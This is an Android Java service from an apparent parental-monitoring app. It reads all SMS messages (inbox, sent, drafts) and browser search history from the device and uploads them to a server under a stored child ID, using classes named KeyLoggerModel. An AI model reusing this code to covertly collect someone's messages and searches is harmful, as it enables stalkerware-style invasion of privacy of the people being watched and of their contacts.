package cybertech.childguide;

import android.app.IntentService;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Browser;
import android.util.Log;

import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.toolbox.Volley;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;


public class SMSIntentService extends IntentService {

    TinyDB tinyDB;
    private String childID;

    public SMSIntentService() {
        super("SMSIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        tinyDB = new TinyDB(SMSIntentService.this);
        childID = tinyDB.getString("childid");
        Log.i("Thread", "Event thread started...");
        Log.i("Thread", "Event thread Childid : " + childID);
        List<KeyLoggerModel> list = new ArrayList<>();
        StringBuilder smsBuffer = new StringBuilder();
        smsBuffer.append("");
        Uri uri = Uri.parse("content://sms");
        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
        Response.Listener<String> litener = new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("Thread", "upload SMS successfully..");
            }
        };
        if (cursor != null && cursor.moveToFirst()) {
            Log.i("Thread", "loading SMS...");
            for (int i = 0; i < cursor.getCount(); i++) {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String number = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                Date smsDayTime = new Date(Long.valueOf(date));
                String smsDate = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss a").format(smsDayTime);
                String type = cursor.getString(cursor.getColumnIndexOrThrow("type"));
                switch (Integer.parseInt(type)) {
                    case 1:
                        smsBuffer.append("sms_inbox" + body + "-----" + number + "______" + smsDate + "______");
                        break;

                    case 2:
                        smsBuffer.append("sms_sent" + body + "-----" + number + "______" + smsDate + "______");
                        break;

                    case 3:
                        smsBuffer.append("sms_draft" + body + "-----" + number + "______" + smsDate + "______");
                        break;
                }
                list.add(new KeyLoggerModel("Text", smsDayTime, smsBuffer.toString()));
                cursor.moveToNext();
            }
            Log.i("Thread", "smsBuffer size: " + smsBuffer.length());
            //Log.i("Thread", " SMS Event: " + smsBuffer.toString());
            String order = Browser.SearchColumns.DATE + " DESC";
            Cursor mCur = getContentResolver().query(Browser.SEARCHES_URI, Browser.SEARCHES_PROJECTION, null, null, order);
            if (mCur != null) {
                mCur.moveToFirst();
                while (!mCur.isAfterLast()) {
                    String search = mCur.getString(Browser.SEARCHES_PROJECTION_SEARCH_INDEX);
                    Date date = new Date(mCur.getLong(Browser.SEARCHES_PROJECTION_DATE_INDEX));
                    String siteDate = new SimpleDateFormat("dd-MM-yyyy hh:mm:ss").format(date);
                    // adding original list with for sending to server.
                    smsBuffer.append("search:" + search + "______" + siteDate + "______");
                    //list.add(new KeyLoggerModel("Search", siteDate, search));
                    mCur.moveToNext();
                }
            }
            mCur.close();
        }
        cursor.close();
        Log.i("Thread", "Event connection started...");
        Log.i("Thread", "Event list size : " + list.size());
        ChildConnection con = new ChildConnection(childID, litener, smsBuffer);
        RequestQueue queue = Volley.newRequestQueue(SMSIntentService.this);
        queue.add(con);

    }

}
